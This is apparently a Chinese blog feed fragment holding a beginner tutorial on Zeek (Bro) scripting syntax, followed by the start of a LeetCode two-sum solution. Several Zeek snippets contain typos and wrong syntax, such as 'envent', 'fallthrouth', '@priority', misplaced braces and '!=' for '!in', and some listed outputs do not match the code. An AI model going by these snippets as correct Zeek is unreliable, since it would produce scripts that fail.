<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	print &quot;Hello, World&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">event bro_done()</span><br><span class="line">	&#123;</span><br><span class="line">	print &quot;Goodbye, World&quot;;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p><code>bro_init()</code>和<code>bro_done()</code>都是基本事件，当Zeek开始运行时会执行<code>bro_init()</code>事件，当Zeek停止运行时会执行<code>bro_done()</code>事件。</p>
<p><a href="https://docs.zeek.org/en/stable/script-reference/log-files.html">这里</a>还有更多的Zeek基本事件。</p>
<h2 id="加载脚本">加载脚本</h2>
<p>像其他的编程语言一样，Zeek也可以通过<code>@load</code>关键字来加载其他脚本中的代码。即：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@load misc&#x2F;dump-events</span><br></pre></td></tr></table></figure>
<p><code>misc/dump-events</code>这个脚本将Zeek产生的事件以可读的形式展现出来，通常用于调试以及理解事件及其参数。部分输出如下图所示：</p>
<p><img src="https://i.loli.net/2019/09/23/gM1EVGi7Lj8oB5x.png" alt=""></p>
<h2 id="函数">函数</h2>
<p>首先来看一个示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Function implementation</span><br><span class="line">function emphasize(s: string, p: string &amp;default &#x3D; &#39;*&#39;): string</span><br><span class="line">	&#123;</span><br><span class="line">	return p + s + p;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">envent bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	# Function calls</span><br><span class="line">	print emphasize(&quot;yes&quot;);</span><br><span class="line">	print emphasize(&quot;no&quot;, &quot;_&quot;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*yes*</span><br><span class="line">_no_</span><br></pre></td></tr></table></figure>
<p>有其他编程经验的同学看这个例子应该比较好理解。这里简单说一下<code>emphasize()</code>函数，它接收两个<code>String</code>类型的参数，其中第二个参数有一个默认值<code>*</code>（用<code>&amp;default</code>关键字修饰），即可选参数，并规定了返回值类型是<code>String</code>。</p>
<p>另外一点，Zeek可以直接使用<code>+</code>来拼接字符串。</p>
<p>Another side note on the relation between functions and events: Events are a kind of function as well, and both can only be declared at the global level; one cannot nest them.</p>
<h2 id="变量">变量</h2>
<p>关于变量的作用域，Zeek提供了两种关键字来修饰变量：<code>local</code>和<code>global</code>。具体示例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">global x &#x3D; &#39;Hello&#39;;</span><br><span class="line"></span><br><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	print x;</span><br><span class="line">	</span><br><span class="line">	const y &#x3D; &quot;Guten Tag&quot;;</span><br><span class="line">	# Changing value of &#39;y&#39; is not allowed.</span><br><span class="line">	#y &#x3D; &quot;Nope&quot;;</span><br><span class="line">	</span><br><span class="line">	local z &#x3D; &quot;What does that mean?&quot;;</span><br><span class="line">	print z;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">event bro_done()</span><br><span class="line">	&#123;</span><br><span class="line">	x &#x3D; &quot;Bye&quot;;</span><br><span class="line">	print x;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello</span><br><span class="line">What does that mean?</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure>
<p>可以看到，用<code>local</code>修饰的变量的作用域严格限制在函数体内，<code>global</code>类似于全局变量的效果，如果在函数内部定义了一个与全局变量相同的局部变量，那么局部变量会覆盖全局变量。</p>
<p>另外，用<code>const</code>修饰的变量相当于常数，是不可更改的。</p>
<h2 id="原始数据类型">原始数据类型</h2>
<p>对于变量的数据类型，Zeek和C、Java等语言相似，即一个变量保存的数据类型是固定的，并且它可以从你的赋值来推断该变量的数据类型，不用显示地声明，也就说<code>local x = 0</code>和<code>local x: count = 0</code>是等价的。</p>
<p><a href="https://docs.zeek.org/en/stable/script-reference/types.html#type-count">这里</a>列举了Zeek支持的所有数据类型。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local x: string &#x3D; &quot;two&quot;;</span><br><span class="line">	local y: int &#x3D; 10000000000000000000000000000000000000000000000000;</span><br><span class="line">	print &quot;y is a large int:&quot;, y;</span><br><span class="line">	print &quot;x is a short string:&quot;, x;</span><br><span class="line">	</span><br><span class="line">	#pattern matching</span><br><span class="line">	print &#x2F;one|two|three&#x2F; &#x3D;&#x3D; &quot;two&quot;;</span><br><span class="line">	print &#x2F;one|two|three&#x2F; &#x3D;&#x3D; &quot;ones&quot;;</span><br><span class="line">	print &#x2F;one|two|three&#x2F; in ones;</span><br><span class="line">	print &#x2F;[123].*&#x2F; &#x3D;&#x3D; &quot;2 two&quot;;</span><br><span class="line">	print &#x2F;[123].*&#x2F; &#x3D;&#x3D; &quot;4 four&quot;;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">y is a large int:, -1</span><br><span class="line">x is a short string:, two</span><br><span class="line">T</span><br><span class="line">F</span><br><span class="line">T</span><br><span class="line">T</span><br><span class="line">F</span><br></pre></td></tr></table></figure>
<p>上面例子的第二部分给我们演示了一种模式匹配（看起来有点像正则表达式），两个<code>/</code>符号中是待匹配的式子，不同元素用<code>|</code>符号隔开。<code>==</code>是精确匹配，<code>in</code>是模糊匹配，<code>[123].*</code>匹配任意以123其中某一个数字开头的字符串。</p>
<h2 id="操作符">操作符</h2>
<h3 id="数学操作符">数学操作符</h3>
<table>
<thead>
<tr>
<th style="text-align:left">Name</th>
<th style="text-align:left">Syntax</th>
<th style="text-align:left">Example Usage</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">加</td>
<td style="text-align:left"><code>a + b</code></td>
<td style="text-align:left"><code>print 2 + 2; # 4</code></td>
</tr>
<tr>
<td style="text-align:left">减</td>
<td style="text-align:left"><code>a - b</code></td>
<td style="text-align:left"><code>print 2 - 2; # 0</code></td>
</tr>
<tr>
<td style="text-align:left">乘</td>
<td style="text-align:left"><code>a * b</code></td>
<td style="text-align:left"><code>print 4 * 4; # 16</code></td>
</tr>
<tr>
<td style="text-align:left">除</td>
<td style="text-align:left"><code>a / b</code></td>
<td style="text-align:left"><code>print 15 / 3; # 5</code></td>
</tr>
<tr>
<td style="text-align:left">取余</td>
<td style="text-align:left"><code>a % b</code></td>
<td style="text-align:left"><code>print 18 % 15; # 3</code></td>
</tr>
<tr>
<td style="text-align:left">一元加号</td>
<td style="text-align:left"><code>+a</code></td>
<td style="text-align:left"><code>local a = +1; # Force use of a signed integer</code></td>
</tr>
<tr>
<td style="text-align:left">一元减号</td>
<td style="text-align:left"><code>-a</code></td>
<td style="text-align:left"><code>local a = 5; print -a; # -5</code></td>
</tr>
<tr>
<td style="text-align:left">自增</td>
<td style="text-align:left"><code>++a</code></td>
<td style="text-align:left"><code>local a = 1; print ++a, a; # 2, 2</code></td>
</tr>
<tr>
<td style="text-align:left">自减</td>
<td style="text-align:left"><code>--a</code></td>
<td style="text-align:left"><code>local a = 2; print --a, a; # 1, 1</code></td>
</tr>
</tbody>
</table>
<h3 id="赋值操作符">赋值操作符</h3>
<table>
<thead>
<tr>
<th>Name</th>
<th>Synatx</th>
<th>Example Usage</th>
</tr>
</thead>
<tbody>
<tr>
<td>=赋值</td>
<td><code>a=b</code></td>
<td><code>local a = 7;</code></td>
</tr>
<tr>
<td>+赋值</td>
<td><code>a += b</code></td>
<td><code>local a = 7; a += 2; # 9</code></td>
</tr>
<tr>
<td>-赋值</td>
<td><code>a -= b</code></td>
<td><code>local a = 7; a -= 2; # 5</code></td>
</tr>
</tbody>
</table>
<h3 id="关系操作符">关系操作符</h3>
<table>
<thead>
<tr>
<th style="text-align:left">Name</th>
<th style="text-align:left">Syntax</th>
<th style="text-align:left">Example Usage</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Equality</td>
<td style="text-align:left"><code>a == b</code></td>
<td style="text-align:left"><code>print 2 == 2; # T</code></td>
</tr>
<tr>
<td style="text-align:left">不等</td>
<td style="text-align:left"><code>a != b</code></td>
<td style="text-align:left"><code>print 2 != 2; # F</code></td>
</tr>
<tr>
<td style="text-align:left">小于</td>
<td style="text-align:left"><code>a &lt; b</code></td>
<td style="text-align:left"><code>print 2 &lt; 3; # T</code></td>
</tr>
<tr>
<td style="text-align:left">小于等于</td>
<td style="text-align:left"><code>a &lt;= b</code></td>
<td style="text-align:left"><code>print 2 &lt;= 2; # T</code></td>
</tr>
<tr>
<td style="text-align:left">大于</td>
<td style="text-align:left"><code>a &gt; b</code></td>
<td style="text-align:left"><code>print 2 &gt; 3; # F</code></td>
</tr>
<tr>
<td style="text-align:left">大于等于</td>
<td style="text-align:left"><code>a &gt;= b</code></td>
<td style="text-align:left"><code>print 2 &gt;= 2; # T</code></td>
</tr>
</tbody>
</table>
<h3 id="其他操作符">其他操作符</h3>
<table>
<thead>
<tr>
<th style="text-align:left">Name</th>
<th style="text-align:left">Syntax</th>
<th style="text-align:left">Example Usage</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">存在于</td>
<td style="text-align:left"><code>a in b</code></td>
<td style="text-align:left"><code>print &quot;z&quot; in &quot;test&quot;; # F</code></td>
</tr>
<tr>
<td style="text-align:left">不存在于</td>
<td style="text-align:left"><code>a !in b</code></td>
<td style="text-align:left"><code>print &quot;z&quot; !in &quot;test&quot;; # T</code></td>
</tr>
<tr>
<td style="text-align:left">大小/长度</td>
<td style="text-align:left"><code>|a|</code></td>
<td style="text-align:left"><code>print |&quot;test&quot;|; # 4</code></td>
</tr>
<tr>
<td style="text-align:left">绝对值</td>
<td style="text-align:left"><code>|a|</code></td>
<td style="text-align:left"><code>print |-5|; # 5</code></td>
</tr>
<tr>
<td style="text-align:left">索引取值</td>
<td style="text-align:left"><code>a[i]</code></td>
<td style="text-align:left"><code>print &quot;test&quot;[2]; # s</code></td>
</tr>
<tr>
<td style="text-align:left">切片</td>
<td style="text-align:left"><code>a[i:j], a[i:], a[:j]</code></td>
<td style="text-align:left"><code>print &quot;testing&quot;[2:4]; # st</code></td>
</tr>
</tbody>
</table>
<h2 id="If语句">If语句</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local x &#x3D; &quot;3&quot;;</span><br><span class="line">	</span><br><span class="line">	for (c in &quot;12345&quot;)</span><br><span class="line">		&#123;</span><br><span class="line">		if (c &#x3D;&#x3D; x)</span><br><span class="line">			&#123;</span><br><span class="line">			print &quot;Found it!&quot;;</span><br><span class="line">			print fmt(&quot;And by &#39;it&#39;, I mean %s.&quot;, x);</span><br><span class="line">			&#125;</span><br><span class="line">		else</span><br><span class="line">			&#123;</span><br><span class="line">			print &quot;I&#39;m looking for&quot;, x, &quot;not&quot;, c;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I&#39;m looking for, 3, not, 1</span><br><span class="line">I&#39;m looking for, 3, not, 2</span><br><span class="line">Found it.</span><br><span class="line">And by &#39;it&#39;, I mean 3.</span><br><span class="line">I&#39;m looking for, 3, not, 4</span><br><span class="line">I&#39;m looking for, 3, not, 5</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Zeek的if语句和其他语言类似，有<code>if...else...</code>语句块，也有<code>if...else if...else...</code>语句块。</p>
<p>这里用到了<code>fmt()</code>函数用于格式化输出，语法与Python类似。它也可以使用<code>,</code>连接字符串和变量之间。</p>
<h2 id="foreach语句">foreach语句</h2>
<p>见if语句章节。</p>
<p>这里需要注意的是，除了<code>vector</code>类型外，其他的所有<code>collection</code>类型的数据类型都不能保证循环的顺序。 If the order is important the collection should be a vector.</p>
<h2 id="While语句">While语句</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local i &#x3D; 0;</span><br><span class="line">	</span><br><span class="line">	while (i &lt; 5)</span><br><span class="line">	print ++i;</span><br><span class="line">	</span><br><span class="line">	while (i % 2 !&#x3D; 0)</span><br><span class="line">	&#123;</span><br><span class="line">	local finish_up &#x3D; F;</span><br><span class="line">	</span><br><span class="line">	if (finish_up &#x3D;&#x3D; F)</span><br><span class="line">		print &quot;nope&quot;;</span><br><span class="line">		++i;</span><br><span class="line">		next;</span><br><span class="line">		</span><br><span class="line">	if (finish_up)</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	print i;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里的<code>break</code>和<code>next</code>类似与其他语言中的<code>break</code>和<code>continue</code>。</p>
<p>另外，上面这段代码是官方给的示例，Zeek语法的缩进反正我最先看是看的是一愣一愣的，后来才发现Zeek是既支持缩进，也支持<code>&#123;&#125;</code>，这两种都认。</p>
<h2 id="练习一">练习一</h2>
<ol>
<li>编写一个程序，从您选择的任意字符串中删除所有的字母“e”（可以不就地处理）。</li>
<li>编写一个程序，打印从1到100，如果是3的倍数，打印“Fizz”；如果是5的倍数，打印“Buzz”。如果既是3的倍数也是5的倍数打印<code>FizzBuzz</code>。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local result &#x3D; &quot;&quot;;</span><br><span class="line">	</span><br><span class="line">	for (c in &quot;testing&quot;)</span><br><span class="line">		&#123;</span><br><span class="line">		if (c !&#x3D; &quot;e&quot;)</span><br><span class="line">			&#123;</span><br><span class="line">			result +&#x3D; c;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	print result;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"># 使用递归</span><br><span class="line">function fizzbuzz(i: count)</span><br><span class="line">	&#123;</span><br><span class="line">	local s &#x3D; &quot;&quot;;</span><br><span class="line">	</span><br><span class="line">	if (i % 3 &#x3D;&#x3D; 0)</span><br><span class="line">		s +&#x3D; &quot;Fizz&quot;;</span><br><span class="line">	if (i % 5 &#x3D;&#x3D; 0)</span><br><span class="line">		s +&#x3D; &quot;Buzz&quot;;</span><br><span class="line">	if (s &#x3D;&#x3D; &quot;&quot;)</span><br><span class="line">		print i;</span><br><span class="line">	else</span><br><span class="line">		print s;</span><br><span class="line">	</span><br><span class="line">	if (i &lt; 100)</span><br><span class="line">		fizzbuzz(i + 1);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">event bro_done()</span><br><span class="line">	&#123;</span><br><span class="line">	fizzbuzz(1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Switch表达式">Switch表达式</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local x &#x3D; 4;</span><br><span class="line">	</span><br><span class="line">	switch (x)</span><br><span class="line">		&#123;</span><br><span class="line">		case 0:</span><br><span class="line">			print &quot;case 0&quot;;</span><br><span class="line">			break;</span><br><span class="line">		case 1, 2, 3:</span><br><span class="line">			print &quot;case 1, 2, 3&quot;;</span><br><span class="line">			break;</span><br><span class="line">		case 4:</span><br><span class="line">			print &quot;case 4 and ...&quot;;</span><br><span class="line">			fallthrouth;</span><br><span class="line">		case 5:</span><br><span class="line">			# This block may execute if x is 4 or 5.</span><br><span class="line">			print &quot;case 5&quot;;</span><br><span class="line">		default:</span><br><span class="line">			print &quot;default case&quot;;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>fallthrouth</code>关键字会让程序忽略限制条件而接着执行下一个case。</p>
<p>练习：</p>
<p>使用Switch语句编写一个程序，计算任意字符串中的元音（a，e，i，o，u）的数量。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local result &#x3D; 0;</span><br><span class="line">	local input &#x3D; &quot;The Zeek Network Security Monitor&quot;;</span><br><span class="line">	for (c in input)</span><br><span class="line">		&#123;</span><br><span class="line">		switch (c)</span><br><span class="line">			&#123;</span><br><span class="line">			case &quot;a&quot;, &quot;e&quot;, &quot;i&quot;, &quot;o&quot;, &quot;u&quot;:</span><br><span class="line">				++result;</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	print result;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="事件">事件</h2>
<p>Event算是Zeek里面比较核心的概念，可以算是一种特殊形式的函数，但与函数又不同的是：</p>
<ul>
<li>事件并不想函数一样会立刻执行，它们可能会在以后的时间进行调度和执行，因此它们的效果在调用之后可能无法直接实现；</li>
<li>它们没有返回值，因为它们没有被直接调用而是被安排在以后执行；</li>
<li>可以为同一事件定义多个主体，每个主体都被视为“事件处理程序”。 当需要执行一个事件时，该事件的所有处理程序主体均按优先级顺序执行。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">global myevent: event(s: string);</span><br><span class="line"></span><br><span class="line">global n &#x3D; 1;</span><br><span class="line"></span><br><span class="line">event myevent(s: string) &amp;priority &#x3D; -10</span><br><span class="line">	&#123;</span><br><span class="line">	n &#x3D; n + 2;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">event myevent(s: string) &amp;priority &#x3D; 5</span><br><span class="line">	&#123;</span><br><span class="line">	--n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">event myevent(s: string) &amp;priority &#x3D; 10</span><br><span class="line">	&#123;</span><br><span class="line">	print &quot;myevent&quot;, s, n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	print &quot;bro_init()&quot;;</span><br><span class="line">	event myevent(&quot;hi&quot;);</span><br><span class="line">	event myevent(&quot;wait&quot;);</span><br><span class="line">	schedule 5 sec &#123; myevent(&quot;bye&quot;) &#125;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">event bro_done()</span><br><span class="line">	&#123;</span><br><span class="line">	print &quot;bro_done()&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bro_init()</span><br><span class="line">myevent, hi, 1</span><br><span class="line">myevent, wait, 2</span><br><span class="line">myevent, bye, 3</span><br><span class="line">bro_done()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我把官方的例子修改了一点，感觉这样更能体现Event的特点。</p>
<p>在<code>bro_init()</code>中每执行一次<code>my_event</code>都会把该事件的三个主体按照<code>@priority</code>的顺序分别执行一次。其中前两次会以迅速执行<code>my_event</code>，而第三次会5s后或者Zeek执行结束之前执行。</p>
<p>需要注意的是：</p>
<ul>
<li>如果没有显示指定，<code>@priority</code>参数会默认为0；</li>
<li>如果<code>@priority</code>都相等，则按顺序执行。</li>
</ul>
<h2 id="Hook">Hook</h2>
<p>Hook是另外一种形式的函数，与Event类似，但是又有两点不太一样：</p>
<ul>
<li>它被调用时会立刻执行；</li>
<li>如果执行到主体的末尾或返回语句，则将执行Hook处理程序。 但是，如果Hook的主体以break语句终止，则不会执行其余的Hook处理程序。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">global myhook: hook(s: string)</span><br><span class="line"></span><br><span class="line">hook myhook(s: string) @priority &#x3D; 10</span><br><span class="line">	&#123;</span><br><span class="line">	print &quot;priority 10 myhook handler&quot;, s;</span><br><span class="line">	s &#x3D; &quot;bye&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">hook myhook(s: string)</span><br><span class="line">	&#123;</span><br><span class="line">	print &quot;break out of myhook handling&quot;, s;</span><br><span class="line">	break;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">hook myhook(s: string) &amp;priority &#x3D; -5</span><br><span class="line">	&#123;</span><br><span class="line">	print &quot;not going to happen&quot;, s;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local ret:bool &#x3D; hook myhook(&quot;hi&quot;);</span><br><span class="line">	if ( ret )</span><br><span class="line">		&#123;</span><br><span class="line">		print &quot;all handlers ran&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">priority 10 myhook handler, hi</span><br><span class="line">break out of myhook handling, hi</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Composite-types-Set-集合">Composite-types: Set 集合</h2>
<p><code>set</code>：集合类型，其中元素唯一，可以使用<code>add</code>和<code>delete</code>函数对元素进行增删操作，以及<code>in</code>操作符判断是否存在。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local x: set[string] &#x3D; &#123;&quot;one&quot;, &quot;two&quot;, &quot;three&quot;&#125;;</span><br><span class="line">	add x[&quot;four&quot;];</span><br><span class="line">	print &quot;four&quot; in x;</span><br><span class="line">	delete x[&quot;two&quot;];</span><br><span class="line">	print &quot;two&quot; !&#x3D; x;</span><br><span class="line">	add x[&quot;one&quot;];</span><br><span class="line">	</span><br><span class="line">	for (e in x)</span><br><span class="line">		&#123;</span><br><span class="line">		print e;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">T</span><br><span class="line">T</span><br><span class="line">four</span><br><span class="line">three</span><br><span class="line">one</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Composite-types-Table-映射">Composite-types: Table 映射</h2>
<p>Zeek中的<code>table</code>类型类似于<code>dict</code>或<code>Map</code>，索引是唯一的，可以使用<code>delete</code>进行删除操作，可以直接赋值操作来新增元素。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local x: table[count] of string &#x3D; &#123; [1] &#x3D; &quot;one&quot;,</span><br><span class="line">										[3] &#x3D; &quot;three&quot;,</span><br><span class="line">										[5] &#x3D; &quot;five&quot;&#125;;</span><br><span class="line">	x[7] &#x3D; &quot;seven&quot;;</span><br><span class="line">	print 7 in x;</span><br><span class="line">	delete x[3];</span><br><span class="line">	print 3 !&#x3D; x;</span><br><span class="line">	x[1] &#x3D; &quot;1&quot;; # changed the value at index 1</span><br><span class="line">	</span><br><span class="line">	for (key in x)</span><br><span class="line">		&#123;</span><br><span class="line">		print key;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">T</span><br><span class="line">seven</span><br><span class="line">T</span><br><span class="line">1</span><br><span class="line">7</span><br><span class="line">5</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>需要注意的是，<code>table</code>数据类型定义的方法<code>table [count] of string</code>。</p>
<h2 id="Composite-types-Vector-向量">Composite-types: Vector 向量</h2>
<p><code>Vector</code>类似于<code>arrary</code>或<code>list</code>，允许有重复的元素。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local x: vector of string &#x3D; &#123;&quot;one&quot;, &quot;two&quot;, &quot;three&quot;&#125;;</span><br><span class="line">	print x;</span><br><span class="line">	print x[1];</span><br><span class="line">	print |x|;</span><br><span class="line">	x[|x|] &#x3D; &quot;one&quot;;</span><br><span class="line">	print x;</span><br><span class="line">	</span><br><span class="line">	for (i in x)</span><br><span class="line">		&#123;</span><br><span class="line">		print i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[one, two, three]</span><br><span class="line">two</span><br><span class="line">3</span><br><span class="line">[one, two, three, one]</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>vector of string</code>指明<code>vector</code>中元素类型。</p>
<h2 id="Composite-types-Record-记录">Composite-types: Record 记录</h2>
<p><code>Record</code>记录类型，类似于C语言中的结构体。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type MyRecord: record &#123;</span><br><span class="line">	a: string;</span><br><span class="line">	b: count;</span><br><span class="line">	c: bool &amp;default &#x3D; T;</span><br><span class="line">	d: int &amp;optional;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local x &#x3D; MyRecord($a &#x3D; &quot;vvvvvv&quot;, $b &#x3D; 6, $c &#x3D; F, $d &#x3D; -13);</span><br><span class="line">	if (x?$d)</span><br><span class="line">		print x$d;</span><br><span class="line">	&#125;</span><br><span class="line">	print x;</span><br><span class="line">	</span><br><span class="line">	x &#x3D; MyRecord($a &#x3D; &quot;abc&quot;, $b &#x3D; 3);</span><br><span class="line">	print x;</span><br><span class="line">	print x$c;</span><br><span class="line">	print x?$d;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-13</span><br><span class="line">[a&#x3D;vvvvvv, b&#x3D;6, c&#x3D;F, d&#x3D;-13]</span><br><span class="line">[a&#x3D;abc, b&#x3D;3, c&#x3D;T, d&#x3D;&lt;uninitialized&gt;]</span><br><span class="line">T</span><br><span class="line">F</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>$</code>操作符通常类似于<code>.</code>操作符，<code>x?$d</code>用于判断<code>x</code>中是否存在字段<code>d</code>。</p>
<h2 id="Zeek特有的数据类型">Zeek特有的数据类型</h2>
<ul>
<li>time：时间戳</li>
<li>interval：时间相对单位，包括<code>usec</code>, <code>msec</code>, <code>sec</code>, <code>min</code>, <code>hr</code>, 和<code>day</code></li>
<li>port：端口</li>
<li>addr：IP地址</li>
<li>subnet：子网</li>
</ul>
]]></content>
      <categories>
        <category>流量分析</category>
        <category>Bro</category>
      </categories>
      <tags>
        <tag>Bro</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode_Primary-class</title>
    <url>/Algorithm/1.Leetcode-Primary-class/</url>
    <content><![CDATA[<h1 id="Leetcode-Primary-Class">Leetcode Primary Class</h1>
<h2 id="1-two-sum-两数之和">#1 two-sum 两数之和</h2>
<h3 id="Question">Question</h3>
<p>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那两个整数，并返回他们的数组下标。</p>
<p>你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。</p>
<h3 id="Example">Example</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定 nums &#x3D; [2, 7, 11, 15], target &#x3D; 9</span><br><span class="line"></span><br><span class="line">因为 nums[0] + nums[1] &#x3D; 2 + 7 &#x3D; 9</span><br><span class="line">所以返回 [0, 1]</span><br></pre></td></tr></table></figure>
<h3 id="Solution">Solution</h3>
<h4 id="方法一">方法一</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span>(<span class="params">self, nums, target</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> index, value <span class="keyword">in</span> enumerate(nums):</span><br><span class="line">        	left = target-value</span><br><span class="line">        	<span class="keyword">if</span> left <span class="keyword">in</span> nums[(index+<span class="number">1</span>):]:</span><br><span class="line">        		left_index = nums.index(left)</span><br><span class="line">        		<span class="keyword">if</span> index == left_index:</span><br><span class="line">        			left_index = left_index + nums[left_index+<span class="number">1</span>:].index(left) + <span class="number">1</span></span><br><span class="line">        		<span class="keyword">return</span> [index, left_index]</span><br><span class="line">        <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure>
<h4 id="方法二">方法二</h4>
<p>参考了大神们的解法，通过哈希来求解，这里通过字典来模拟哈希查询的过程。<br>
个人理解这种办法相较于方法一其实就是字典记录了 num1 和 num2 的值和位置，而省了再查找 num2 索引的步骤。</p>
